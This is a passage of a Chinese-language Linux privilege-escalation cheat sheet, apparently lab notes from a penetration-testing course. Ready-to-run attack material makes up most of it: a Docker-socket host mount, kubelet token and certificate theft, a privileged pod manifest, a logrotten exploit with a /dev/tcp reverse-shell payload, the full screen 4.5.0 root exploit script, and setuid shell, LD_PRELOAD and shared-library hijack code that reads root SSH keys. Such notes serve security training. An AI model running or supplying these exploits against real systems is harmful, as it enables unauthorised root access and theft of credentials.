+<h3 id="Cron"><a href="#Cron" class="headerlink" title="Cron"></a>Cron</h3><p>每一项：<code>分钟、小时、日期、月份、星期、[用户、]命令</code></p>
+<p>字符：</p>
+<ul>
+<li><code>*</code>：每一个<ul>
+<li>在小时字段使用表示每小时</li>
+</ul>
+</li>
+<li><code>,</code>：分隔不连续的值</li>
+<li><code>-</code>：连续的范围</li>
+<li><code>/</code>：指定步长或频率</li>
+</ul>
+<p>crontab</p>
+<ul>
+<li>系统级 crontab<ul>
+<li>&#x2F;etc&#x2F;crontab</li>
+</ul>
+</li>
+<li>配置文件目录<ul>
+<li>&#x2F;etc&#x2F;cron.d&#x2F;</li>
+</ul>
+</li>
+<li>用户个人，文件名为执行的用户<ul>
+<li>&#x2F;var&#x2F;spool&#x2F;cron&#x2F;</li>
+</ul>
+</li>
+<li>存放可执行脚本的目录<ul>
+<li>&#x2F;etc&#x2F;cron.hourly&#x2F;</li>
+<li>&#x2F;etc&#x2F;cron.daily&#x2F;</li>
+<li>&#x2F;etc&#x2F;cron.weekly&#x2F;</li>
+<li>&#x2F;etc&#x2F;cron.monthly&#x2F;</li>
+</ul>
+</li>
+</ul>
+<p>用户可以使用 <code>crontab -l</code> 列出自身 crontab 但无法读取别人的，可以使用 [pspy](<a target="_blank" rel="noopener" href="https://github.com/DominicBreuker/pspy">DominicBreuker&#x2F;pspy: Monitor linux processes without root permissions</a>) 等工具监控进程</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./pspy64 -pf -i 1000</span><br><span class="line"><span class="comment"># -pf 打印命令和文件系统事件</span></span><br><span class="line"><span class="comment"># -i 1000 每1000ms扫描一次procfs</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h3><p>允许使用 docker 提权的条件：</p>
+<ul>
+<li>用户处于 docker 组</li>
+<li>或 docker 设置了 suid</li>
+<li>或用户有 sudo docker 的权限</li>
+</ul>
+<h4 id="Shared-Directories-volume-mounts"><a href="#Shared-Directories-volume-mounts" class="headerlink" title="Shared Directories(volume mounts)"></a>Shared Directories(volume mounts)</h4><p>可以使用只读或读写模式挂载主机的目录</p>
+<h4 id="Docker-Socket"><a href="#Docker-Socket" class="headerlink" title="Docker Socket"></a>Docker Socket</h4><p><a target="_blank" rel="noopener" href="https://download.docker.com/linux/static/stable/x86_64/">下载docker二进制文件</a></p>
+<p>docker cli 可以使用 docker socket 和 docker daemon 进行通信</p>
+<p>如果容器中存在 docker socket 文件，可以往容器中传入 docker 二进制文件，然后使用 socket 进行通信</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/tmp/docker -H unix:///app/docker.sock run --<span class="built_in">rm</span> -d --privileged -v /:/hostsystem main_app</span><br><span class="line">/tmp/docker -H unix:///app/docker.sock ps</span><br><span class="line">/tmp/docker -H unix:///app/docker.sock <span class="built_in">exec</span> -it &lt;container <span class="built_in">id</span>&gt; /bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>在主机中，docker socket 通常位于 <code>/var/run/docker.sock</code>，如果用户有其可写权限，也可以利用提权</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker -H unix:///var/run/docker.sock run -v /:/mnt --<span class="built_in">rm</span> -it ubuntu <span class="built_in">chroot</span> /mnt bash</span><br></pre></td></tr></table></figure>
+
+<h3 id="k8s"><a href="#k8s" class="headerlink" title="k8s"></a>k8s</h3><p>k8s 可以通过配置 <code>kubelet</code> 来允许 <code>anonymous access</code></p>
+<p>我们可以使用 <code>kubeletctl</code> 和 <code>kubelet</code> 进行交互，获取到 k8s 服务账户的 token 和 certificate(ca.crt)，用于水平移动到集群的其他位置或者访问 Pod 和资源，使用 <code>kubectl</code> 交互</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 提取 pod</span></span><br><span class="line">kubeletctl -i --server 10.129.10.11 pods</span><br><span class="line"><span class="comment"># scan rce</span></span><br><span class="line">kubeletctl -i --server 10.129.10.11 scan rce</span><br><span class="line"><span class="comment"># 命令执行</span></span><br><span class="line">kubeletctl -i --server 10.129.10.11 <span class="built_in">exec</span> <span class="string">&quot;id&quot;</span> -p nginx -c nginx</span><br><span class="line"><span class="comment"># 提取 token</span></span><br><span class="line">kubeletctl -i --server 10.129.10.11 <span class="built_in">exec</span> <span class="string">&quot;cat /var/run/secrets/kubernetes.io/serviceaccount/token&quot;</span> -p nginx -c nginx | <span class="built_in">tee</span> -a k8.token</span><br><span class="line"><span class="comment"># 提取 Certificates</span></span><br><span class="line">kubeletctl --server 10.129.10.11 <span class="built_in">exec</span> <span class="string">&quot;cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt&quot;</span> -p nginx -c nginx | <span class="built_in">tee</span> -a ca.crt</span><br></pre></td></tr></table></figure>
+
+<p>使用 <code>kubectl</code></p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 列出权限</span></span><br><span class="line">kubectl --token=<span class="variable">$token</span> --certificate-authority=ca.crt --server=https://10.129.10.11:6443 auth can-i --list</span><br></pre></td></tr></table></figure>
+
+<p>创建 pod yaml，然后创建新 pod 提权</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">privesc</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">default</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">privesc</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">nginx:1.14.2</span></span><br><span class="line">    <span class="attr">volumeMounts:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">mountPath:</span> <span class="string">/root</span></span><br><span class="line">      <span class="attr">name:</span> <span class="string">mount-root-into-mnt</span></span><br><span class="line">  <span class="attr">volumes:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">mount-root-into-mnt</span></span><br><span class="line">    <span class="attr">hostPath:</span></span><br><span class="line">       <span class="attr">path:</span> <span class="string">/</span></span><br><span class="line">  <span class="attr">automountServiceAccountToken:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">hostNetwork:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建新 pod</span></span><br><span class="line">kubectl --token=<span class="variable">$token</span> --certificate-authority=ca.crt --server=https://10.129.96.98:6443 apply -f privesc.yaml</span><br><span class="line"><span class="comment"># 列出 pods</span></span><br><span class="line">kubectl --token=<span class="variable">$token</span> --certificate-authority=ca.crt --server=https://10.129.96.98:6443 get pods</span><br><span class="line"><span class="comment"># 如果 pod 正在运行，我们可以创建一个反弹shell或者读取文件</span></span><br><span class="line">kubeletctl --server 10.129.10.11 <span class="built_in">exec</span> <span class="string">&quot;cat /root/root/.ssh/id_rsa&quot;</span> -p privesc -c privesc</span><br></pre></td></tr></table></figure>
+
+<h3 id="Logrotate"><a href="#Logrotate" class="headerlink" title="Logrotate"></a>Logrotate</h3><p>rotates, compresses, and mails system logs. 管理日志文件的工具</p>
+<p>该工具通过 <code>cron</code> 定期启动，通过配置文件 <code>/etc/logrotate.conf</code> 控制</p>
+<p>状态文件会记录对每个文件最后一次 rotate 的时间，可以用来寻找可写日志文件，可能存放的位置有：</p>
+<ul>
+<li><code>/var/lib/logrotate.status</code></li>
+<li><code>/var/lib/logrotate/logrotate.status</code></li>
+<li><code>/var/lib/logrotate/status</code></li>
+</ul>
+<p>利用条件：</p>
+<ol>
+<li>对日志文件有 write 权限</li>
+<li>logrotate 必须以特权用户或者 root 用户运行</li>
+<li>易受攻击的版本：<ol>
+<li>3.8.6</li>
+<li>3.11.0</li>
+<li>3.15.0</li>
+<li>3.18.0<br>我们使用 <a target="_blank" rel="noopener" href="https://github.com/whotwagner/logrotten">whotwagner&#x2F;logrotten</a> 进行攻击</li>
+</ol>
+</li>
+</ol>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 编译 logrotten</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/whotwagner/logrotten.git</span><br><span class="line"><span class="built_in">cd</span> logrotten</span><br><span class="line">gcc logrotten.c -o logrotten</span><br><span class="line"><span class="comment"># 准备 payload，同时在攻击机上监听</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/10.10.16.14/9001 0&gt;&amp;1&#x27;</span> &gt; payload</span><br><span class="line"><span class="comment"># 根据 /etc/logrotate 中的设置 create 还是 compress 选择 expolit 命令</span></span><br><span class="line">grep <span class="string">&quot;create\|compress&quot;</span> /etc/logrotate.conf | grep -v <span class="string">&quot;#&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># /tmp/tmp.log替换为可写的日志文件，通过修改日志文件触发logrotten</span></span><br><span class="line"><span class="comment"># 如果是 create</span></span><br><span class="line">./logrotten -p ./payload /tmp/tmp.log &amp;</span><br><span class="line"><span class="comment"># 如果是 compress</span></span><br><span class="line">./logrotten -p ./payload -c -s 4 /tmp/tmp.log &amp;</span><br><span class="line"><span class="comment"># 修改日志文件</span></span><br><span class="line"><span class="built_in">cp</span> /tmp/tmp.log.1 /tmp/tmp.log</span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line"><span class="built_in">cp</span> backups/access.log.1 backups/access.log; ./logrotten -p ./payload /home/htb-student/backups/access.log</span><br></pre></td></tr></table></figure>
+
+<p>利用过程中发现获取到的反弹 shell 存活时间可能很短，可以 <code>chmod 4777 $(which bash)</code> 然后使用 <code>bash -p</code> 获得一个 root shell</p>
+<h3 id="Others"><a href="#Others" class="headerlink" title="Others"></a>Others</h3><h4 id="Screen"><a href="#Screen" class="headerlink" title="Screen"></a>Screen</h4><p><code>screen -v</code> 检查版本</p>
+<p>version 4.5.0</p>
+<p>poc</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># screenroot.sh</span></span><br><span class="line"><span class="comment"># setuid screen v4.5.0 local root exploit</span></span><br><span class="line"><span class="comment"># abuses ld.so.preload overwriting to get root.</span></span><br><span class="line"><span class="comment"># bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html</span></span><br><span class="line"><span class="comment"># HACK THE PLANET</span></span><br><span class="line"><span class="comment"># ~ infodox (25/1/2017)</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;~ gnu/screenroot ~&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] First, we create our shell and library...&quot;</span></span><br><span class="line"><span class="built_in">cat</span> &lt;&lt; <span class="string">EOF &gt; /tmp/libhax.c</span></span><br><span class="line"><span class="string">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;sys/stat.h&gt;</span></span><br><span class="line"><span class="string">__attribute__ ((__constructor__))</span></span><br><span class="line"><span class="string">void dropshell(void)&#123;</span></span><br><span class="line"><span class="string">    chown(&quot;/tmp/rootshell&quot;, 0, 0);</span></span><br><span class="line"><span class="string">    chmod(&quot;/tmp/rootshell&quot;, 04755);</span></span><br><span class="line"><span class="string">    unlink(&quot;/etc/ld.so.preload&quot;);</span></span><br><span class="line"><span class="string">    printf(&quot;[+] done!\n&quot;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line">gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c</span><br><span class="line"><span class="built_in">rm</span> -f /tmp/libhax.c</span><br><span class="line"><span class="built_in">cat</span> &lt;&lt; <span class="string">EOF &gt; /tmp/rootshell.c</span></span><br><span class="line"><span class="string">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="string">int main(void)&#123;</span></span><br><span class="line"><span class="string">    setuid(0);</span></span><br><span class="line"><span class="string">    setgid(0);</span></span><br><span class="line"><span class="string">    seteuid(0);</span></span><br><span class="line"><span class="string">    setegid(0);</span></span><br><span class="line"><span class="string">    execvp(&quot;/bin/sh&quot;, NULL, NULL);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line">gcc -o /tmp/rootshell /tmp/rootshell.c -Wno-implicit-function-declaration</span><br><span class="line"><span class="built_in">rm</span> -f /tmp/rootshell.c</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Now we create our /etc/ld.so.preload file...&quot;</span></span><br><span class="line"><span class="built_in">cd</span> /etc</span><br><span class="line"><span class="built_in">umask</span> 000 <span class="comment"># because</span></span><br><span class="line">screen -D -m -L ld.so.preload <span class="built_in">echo</span> -ne  <span class="string">&quot;\x0a/tmp/libhax.so&quot;</span> <span class="comment"># newline needed</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Triggering...&quot;</span></span><br><span class="line">screen -<span class="built_in">ls</span> <span class="comment"># screen itself is setuid, so...</span></span><br><span class="line">/tmp/rootshell</span><br></pre></td></tr></table></figure>
+
+<h4 id="弱-NFS-权限"><a href="#弱-NFS-权限" class="headerlink" title="弱 NFS 权限"></a>弱 NFS 权限</h4><p>创建一个 NFS volume 时可以设置多种选项，如果设置了 <code>no_root_squash</code>（远程用户以本地 root 用户身份连接到共享时，可以在 NFS 服务器上以 root 用户身份创建文件。这将允许创建带有 SUID 位设置的恶意脚本&#x2F;程序），可以用于在 NFS 服务器的主机上提权</p>
+<p>NFS 主机配置文件：<code>/etc/exports</code></p>
+<p>前提假设</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> /etc/exports</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line">/var/nfs/general *(rw,no_root_squash)</span><br><span class="line">/tmp *(rw,no_root_squash)</span><br></pre></td></tr></table></figure>
+
+<p>创建 shell.c</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">  setuid(0); setgid(0); system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>编译上传</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gcc shell.c -o shell</span><br><span class="line"><span class="built_in">sudo</span> mount -t nfs 10.129.2.12:/tmp /mnt</span><br><span class="line"><span class="built_in">cp</span> shell /mnt</span><br><span class="line"><span class="built_in">chmod</span> u+s /mnt/shell</span><br></pre></td></tr></table></figure>
+
+<p>在 NFS 上提权</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">./shell</span><br></pre></td></tr></table></figure>
+
+<h4 id="Tmux-Sessions-劫持"><a href="#Tmux-Sessions-劫持" class="headerlink" title="Tmux Sessions 劫持"></a>Tmux Sessions 劫持</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tmux -S /shareds new -s debugsess</span><br><span class="line"><span class="built_in">chown</span> root:devs /shareds</span><br><span class="line"><span class="comment"># 如果我们有devs组的用户，就可以attach到这个session并获取root权限</span></span><br><span class="line">tmux -S /shareds</span><br></pre></td></tr></table></figure>
+
+<h4 id="LD-PRELOAD-提权"><a href="#LD-PRELOAD-提权" class="headerlink" title="LD_PRELOAD 提权"></a>LD_PRELOAD 提权</h4><p>原理：LD_PRELOAD 环境变量可以用于指定优先加载的共享库，sudo 时指定恶意共享库进行加载提权</p>
+<p>前提：有一个有 sudo 权限的用户</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> -l</span><br><span class="line"></span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> daniel.carter on NIX02:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD</span><br><span class="line"></span><br><span class="line">User daniel.carter may run the following commands on NIX02:</span><br><span class="line">    (root) NOPASSWD: /usr/sbin/apache2 restart</span><br></pre></td></tr></table></figure>
+
+<p>root.c</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> _init() &#123;</span><br><span class="line">unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">setgid(<span class="number">0</span>);</span><br><span class="line">setuid(<span class="number">0</span>);</span><br><span class="line">system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>编译执行</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -fPIC -shared -o root.so root.c -nostartfiles</span><br><span class="line"><span class="built_in">sudo</span> LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart</span><br></pre></td></tr></table></figure>
+
+<h4 id="Shared-Object-劫持"><a href="#Shared-Object-劫持" class="headerlink" title="Shared Object 劫持"></a>Shared Object 劫持</h4><p>原理：文件以 root 运行时加载的共享库用户可写，可以被劫持，修改为恶意代码提权</p>
+<p>用 <code>ldd</code> 查看二进制文件或共享库所需的共享库</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldd filename</span><br></pre></td></tr></table></figure>
+
+<p><code>RUNPATH</code> 指定一个文件夹，其中的共享库会优先于其他文件夹，可以用 <code>readelf</code> 来查看</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readelf -d filename  | grep PATH</span><br></pre></td></tr></table></figure>
+
+<p>For example:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 发现加载了/development/libshared.so</span></span><br><span class="line">htb-student@NIX02:~$ ldd payroll</span><br><span class="line"></span><br><span class="line">linux-vdso.so.1 =&gt;  (0x00007ffcb3133000)</span><br><span class="line">libshared.so =&gt; /development/libshared.so (0x00007f0c13112000)</span><br><span class="line">libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f7f62876000)</span><br><span class="line">/lib64/ld-linux-x86-64.so.2 (0x00007f7f62c40000)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 允许从/development加载.so</span></span><br><span class="line">htb-student@NIX02:~$ readelf -d payroll  | grep PATH</span><br><span class="line"></span><br><span class="line"> 0x000000000000001d (RUNPATH)            Library runpath: [/development]</span><br><span class="line"></span><br><span class="line"><span class="comment"># /development/目录可写，随便将现有库</span></span><br><span class="line">htb-student@NIX02:~$ <span class="built_in">cp</span> /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so</span><br><span class="line"><span class="comment"># 运行时发现缺少 dbquery 函数</span></span><br><span class="line">htb-student@NIX02:~$ ./payroll </span><br><span class="line">./payroll: symbol lookup error: ./payroll: undefined symbol: dbquery</span><br></pre></td></tr></table></figure>
+
+<p>编写一个.so 实现 dbquery</p>
+<p>src.c</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">dbquery</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Malicious library loaded\n&quot;</span>);</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh -p&quot;</span>);</span><br><span class="line">&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>编译运行</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">htb-student@NIX02:~$ gcc src.c -fPIC -shared -o /development/libshared.so</span><br><span class="line">htb-student@NIX02:~$ ./payroll </span><br><span class="line">***************Inlane Freight Employee Database***************</span><br><span class="line"></span><br><span class="line">Malicious library loaded</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=1008(htb-student) <span class="built_in">groups</span>=1008(htb-student)</span><br></pre></td></tr></table></figure>
+
+<h4 id="Python-库劫持"><a href="#Python-库劫持" class="headerlink" title="Python 库劫持"></a>Python 库劫持</h4><p>基本前提都是 Python 脚本如果被设置了 SUID&#x2F;SGID 在运行时是高权限，我们可以通过劫持其 import 的库来提权</p>
+<p>几种劫持方法：</p>
+<ul>
+<li>错误的写权限<ul>
+<li>import 了可以写的模块，可以通过修改对应模块来插入恶意代码</li>
+</ul>
+</li>
+<li>库路径<ul>
+<li>实际 import 的是低优先级路径的模块，我们对高优先级路径有写权限时，可以在其中创建一个同名模块来实现劫持，写入恶意代码</li>
+<li>查看导入模块的顺序：<code>python3 -c &#39;import sys; print(&quot;\n&quot;.join(sys.path))&#39;</code></li>
+<li>查看模块位置：<code>pip3 show &lt;module name&gt;</code></li>
+</ul>
+</li>
+<li>PYTHONPATH 环境变量<ul>
+<li>PYTHONPATH 指出 Python 可以搜索哪些目录来 import 模块</li>
+<li>对 python 有 sudo 权限：<code>sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.p</code></li>
+</ul>
+</li>
+</ul>
+<h4 id="sudo"><a href="#sudo" class="headerlink" title="sudo"></a>sudo</h4><p>大前提是有一个 sudoer 用户</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/blasty/CVE-2021-3156">CVE-2021-3156</a>：</p>
+<ul>
+<li>1.8.31 - Ubuntu 20.04</li>
+<li>1.8.27 - Debian 10</li>
+<li>1.9.2 - Fedora 33</li>
+<li>and others</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://www.sudo.ws/security/advisories/minus_1_uid/">CVE-2019-14287</a>：&lt;1.8.28</p>
+<h4 id="Polkit"><a href="#Polkit" class="headerlink" title="Polkit"></a>Polkit</h4><p>files:</p>
+<ul>
+<li>actions&#x2F;policies(<code>/usr/share/polkit-1/actions/</code>)</li>
+<li>rules(<code>/usr/share/polkit-1/rules.d/</code>)</li>
+<li>local authority(<code>/etc/polkit-1/localauthority/50-local.d/</code>)</li>
+</ul>
+<p>额外程序：</p>
+<ul>
+<li>pkexec<ul>
+<li>以另一个用户身份运行程序或 root 权限运行</li>
+</ul>
+</li>
+<li>pkaction<ul>
+<li>可用于显示 actions</li>
+</ul>
+</li>
+<li>pkcheck<ul>
+<li>用来检查一个进程是否被授权执行特定的操作</li>
+</ul>
+</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://github.com/arthepsy/CVE-2021-4034">arthepsy&#x2F;CVE-2021-4034: PoC for PwnKit: Local Privilege Escalation Vulnerability in polkit’s pkexec (CVE-2021-4034)</a></p>
+<h4 id="Dirty-Pipe"><a href="#Dirty-Pipe" class="headerlink" title="Dirty Pipe"></a>Dirty Pipe</h4><p><a target="_blank" rel="noopener" href="https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits">AlexisAhmed&#x2F;CVE-2022-0847-DirtyPipe-Exploits: A collection of exploits and documentation that can be used to exploit the Linux Dirty Pipe vulnerability.</a></p>
+<p>Affected versions:</p>
+<ul>
+<li>Linux kernel versions newer than 5.8 are affected.</li>
+<li>So far the vulnerability has been patched in the following Linux kernel versions:<ul>
+<li>5.16.11</li>
+<li>5.15.25</li>
+<li>5.10.102</li>
+</ul>
+</li>
+<li>You can learn more about the vulnerability here: <a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0847">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0847</a></li>
+</ul>
+<h4 id="Netfilter"><a href="#Netfilter" class="headerlink" title="Netfilter"></a>Netfilter</h4><p>Netfilter 是一个内核模块，提供诸如数据包过滤、网络地址转换等功能外，还提供了其他与防火墙相关的工具</p>
